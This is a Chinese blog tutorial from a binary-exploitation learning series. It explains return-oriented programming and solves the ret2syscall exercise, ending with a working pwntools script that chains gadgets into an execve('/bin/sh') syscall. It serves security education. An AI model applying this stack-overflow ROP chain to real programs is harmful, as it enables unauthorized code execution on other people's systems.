---
layout:     post
title:      pwn学习（三）：利用ROP执行恶意代码
subtitle:   利用栈溢出获取控制权
date:       2021-08-09
author:     Hongtai S
header-img: img/7.jpg
catalog: true
tags:
    - 漏洞
    - 二进制
    - 栈溢出
    - pwn
    - ROP
---
# 利用ROP执行恶意代码 #

## Return Oriented Programming(ROP)-面向返回编程 ##

以下一段汇编代码：

mov eax, 0xb

mov ebx, ["/bin/sh"]

mov ecx, 0

mov edx, 0

int 0x80

等价于C代码execve("/bin/sh", NULL, NULL)，将其转换为二进制数据可作为shellcode使用，但是当进程中开启了栈不可执行保护，将无法执行shellcode。而ROP技术可以绕过这机制：

面向返回编程（英语：Return-Oriented Programming，缩写：ROP）是计算机安全漏洞利用技术，该技术允许攻击者在安全防御的情况下执行代码，如不可执行的内存和代码签名。

在栈中若想执行获取shell的命令，但是无法通过代码注入的方式获取，可将获取shell的汇编代码分散开执行，每一小段命令称为gadget。以上面的汇编代码为例，ROP技术是这样执行获取shell的：

任然是利用栈溢出的方式，而覆盖栈的数据不是二进制的命令，而是地址和数据。想要执行mov eav, 0xb命令，可以将栈的返回地址覆盖为内存中任意一个 pop eax；ret的命令的地址，并将返回地址的下一地址继续覆盖位为0x0000000b，此时程序的执行流被劫持并且执行了与mov eax, 0xb的命令，继续覆盖，下一个指令为mov ebx, ["/bin/sh"]，只需在程序中寻找pop ebx；ret命令的地址，用这一地址覆盖栈，并用存放"/bin/sh"的地址覆盖栈的下一地址，那么此时程序成功执行了mov ebx, ["/bin/sh"]这一指令，下面的指令同理。

栈溢出前后的布局如下所示：

|覆盖前|覆盖后|
|返回地址|pop eax；ret的地址|
|正常数据|0xb|
|正常数据|pop ebx；ret的地址|
|正常数据|"/bin/sh"的地址|
|正常数据|pop ecx；ret的地址|
|正常数据|0x0|
|正常数据|pop edx；ret的地址|
|正常数据|0x0|
|正常数据|int 0x80的地址|

溢出后的栈就会控制程序执行流，最终得到系统的shell

## ret2syscall题目分析 ##

将文件ret2syscall拖入Ida中查看还原的C代码：

![1.PNG](https://i.loli.net/2021/08/09/oyPBv3q4lwt7rga.png)

发现不安全的gets()函数,能够利用栈溢出覆盖返回地址以获取一次劫持程序执行流的机会。

使用checksec查看文件详细情况：

![2.PNG](https://i.loli.net/2021/08/09/gUHAcvQxueJXhLr.png)

可以看到栈不可执行，使用ROPgadget查找可利用的gadget，找到了pop eax；ret和pop ebx；ret，但是没有找到pop ecx；ret，但是找到了pop edx ; pop ecx ; pop ebx ; ret命令，同样可以用这个命令地址覆盖栈，产生与mov ebx, ["/bin/sh"];mov ecx, 0;mov edx, 0相同的效果。最后查找int 0x80。全部指令找到。

![3.PNG](https://i.loli.net/2021/08/09/72agMvnOV5Q1xP6.png)

![4.PNG](https://i.loli.net/2021/08/09/aVHLm4bMDAZ7t3z.png)

![5.PNG](https://i.loli.net/2021/08/09/WelxQCo4bTD61ft.png)

另外，还缺少字符串"/bin/sh"的地址，在Ida中使用shift+F12查找，发现了字符串的地址：

![6.PNG](https://i.loli.net/2021/08/09/VCgt6U12niwqfWK.png)

到这里，利用ROP技术获取shell所需的全部数据和地址都已准备好，此时可以精心构造payload，理论上栈的布局前后为：

|覆盖前|覆盖后|
|返回地址|pop eax；ret的地址|
|正常数据|0xb|
|正常数据|pop edx ; pop ecx ; pop ebx ; ret的地址|
|正常数据|0x0|
|正常数据|0x0|
|正常数据|"/bin/sh"的地址|
|正常数据|int 0x80的地址|

这里注意命令pop edx ; pop ecx ; pop ebx ; ret寄存器的先后顺序，按照命令的顺序赋值给寄存器数据。

覆盖到返回地址之前，需要填充部分无用数据，这里使用gdb调试内存栈，查看输入的字符串首地址距离返回地址的距离：

![7.PNG](https://i.loli.net/2021/08/09/UIZfDXsMvp96E5w.png)

计算距离为0xa8-0x3c = 108

payload的内容为'A' * 112 + [pop eax；ret的地址] + p32(0x0000000b) + [pop edx ; pop ecx ; pop ebx ; ret的地址] + p32(0x00000000) + p32(0x00000000) + ["/bin/sh"的地址] + [int 0x80的地址]


## 编写脚本 ##

 ```python
from pwn import *

#远程连接服务器使用remote函数
#io = remote("ip", port)

#使用本地进程测试使用process函数
io = process("ret2syscall")

#接受程序的两行打印
io.recvline()
io.recvline()

pop_eax_ret_addr = p32(0x080bb196)

pop_edx_ecx_edx_ret_addr = p32(0x0806eb90)

str_addr = p32(0x080be408)

int_0x80_addr = p32(0x08049421)

#构造payload
payload = b'A' * 112 + pop_eax_ret_addr + p32(0x0000000b) + pop_edx_ecx_edx_ret_addr + p32(0x00000000) + p32(0x00000000) + str_addr + int_0x80_addr

#发送构造的数据
io.sendline(payload)

#获取shell交互
io.interactive()

```

运行脚本成功获取shell权限

![8.PNG](https://i.loli.net/2021/08/09/yrVbCptjYPUzudA.png)